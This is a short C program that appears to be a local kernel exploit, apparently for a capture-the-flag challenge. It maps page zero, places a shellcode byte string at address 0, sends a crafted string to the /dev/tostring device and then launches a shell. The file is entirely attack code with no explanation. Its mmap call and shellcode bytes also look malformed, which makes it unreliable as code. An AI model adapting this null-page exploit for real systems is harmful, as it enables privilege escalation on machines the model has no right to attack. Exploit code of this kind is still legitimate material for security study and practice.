#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

int main(int argc, char const *argv[])
{
	char shellcode[] = "\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3";
	char receive[20];

	mmap(0, 4096, 7);
	memcpy((void *)0, shellcode, sizeof(shellcode));

	int fd = open("/dev/tostring", 2);
	write(fd, "**********S", 11);
	read(fd, receive, sizeof(receive));
	execl("/bin/sh", "sh", NULL);
	return 0;
}